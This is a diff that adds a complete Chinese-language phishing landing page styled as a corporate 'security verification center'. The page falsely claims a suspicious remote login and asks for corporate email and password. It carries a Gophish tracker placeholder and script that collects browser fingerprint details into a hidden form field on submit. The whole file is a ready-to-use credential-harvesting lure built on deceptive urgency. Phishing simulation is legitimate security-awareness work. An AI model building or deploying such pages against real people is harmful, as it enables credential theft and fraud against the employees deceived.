@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>企业安全验证系统</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: 'Microsoft YaHei', Arial, sans-serif; 
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .container { 
+            background: white; 
+            padding: 40px;
+            border-radius: 15px; 
+            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+            max-width: 450px;
+            width: 90%;
+        }
+        .header { 
+            text-align: center; 
+            margin-bottom: 30px; 
+            border-bottom: 2px solid #e74c3c;
+            padding-bottom: 20px;
+        }
+        .logo { 
+            color: #2c3e50; 
+            font-size: 28px; 
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+        .warning { 
+            background: #ffe6e6; 
+            color: #c0392b; 
+            padding: 15px; 
+            border-radius: 8px; 
+            margin-bottom: 25px;
+            border-left: 4px solid #e74c3c;
+            font-size: 14px;
+        }
+        .form-group { 
+            margin-bottom: 20px; 
+        }
+        label { 
+            display: block; 
+            margin-bottom: 8px; 
+            font-weight: bold; 
+            color: #34495e;
+        }
+        input[type="email"], input[type="password"] { 
+            width: 100%; 
+            padding: 15px; 
+            border: 2px solid #bdc3c7; 
+            border-radius: 8px; 
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+        input[type="email"]:focus, input[type="password"]:focus {
+            outline: none;
+            border-color: #3498db;
+        }
+        .btn { 
+            width: 100%; 
+            padding: 15px; 
+            background: linear-gradient(135deg, #e74c3c, #c0392b); 
+            color: white; 
+            border: none; 
+            border-radius: 8px; 
+            cursor: pointer; 
+            font-size: 16px;
+            font-weight: bold;
+            transition: transform 0.2s;
+        }
+        .btn:hover {
+            transform: translateY(-2px);
+        }
+        .footer { 
+            text-align: center; 
+            margin-top: 25px; 
+            padding-top: 20px;
+            border-top: 1px solid #ecf0f1;
+            font-size: 12px; 
+            color: #7f8c8d;
+        }
+        .security-info {
+            background: #e8f5e8;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            border-left: 4px solid #27ae60;
+            font-size: 13px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo">🔒 企业安全验证中心</div>
+            <p style="color: #7f8c8d;">Enterprise Security Verification</p>
+        </div>
+        
+        <div class="warning">
+            <strong>⚠️ 安全警告</strong><br>
+            检测到您的账户在异地有登录记录，为保障账户安全，请立即验证身份。
+        </div>
+        
+        <div class="security-info">
+            <strong>🛡️ 安全提示</strong><br>
+            请使用您的企业邮箱账户和密码完成验证，验证过程完全加密保护。
+        </div>
+        
+        <form method="POST" id="loginForm">
+            <div class="form-group">
+                <label for="email">📧 企业邮箱</label>
+                <input type="email" id="email" name="email" placeholder="请输入您的企业邮箱" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="password">🔑 登录密码</label>
+                <input type="password" id="password" name="password" placeholder="请输入您的登录密码" required>
+            </div>
+            
+            <button type="submit" class="btn">立即验证身份</button>
+        </form>
+        
+        <div class="footer">
+            <p>本系统采用银行级加密技术保护您的信息安全</p>
+            <p>技术支持：IT安全部 | 24小时服务热线：400-xxx-xxxx</p>
+        </div>
+    </div>
+    
+    <!-- Gophish追踪代码 -->
+    {{.Tracker}}
+    
+    <script>
+        // 增强用户体验和数据收集
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            // 收集浏览器信息
+            var browserInfo = {
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                screenResolution: screen.width + 'x' + screen.height,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cookieEnabled: navigator.cookieEnabled
+            };
+            
+            // 创建隐藏字段存储信息
+            var hiddenField = document.createElement('input');
+            hiddenField.type = 'hidden';
+            hiddenField.name = 'browser_info';
+            hiddenField.value = JSON.stringify(browserInfo);
+            this.appendChild(hiddenField);
+            
+            console.log('用户信息已收集:', browserInfo);
+        });
+        
+        // 模拟实时验证效果
+        document.getElementById('email').addEventListener('input', function() {
+            if (this.value.includes('@')) {
+                this.style.borderColor = '#27ae60';
+            }
+        });
+    </script>
+</body>
+</html>
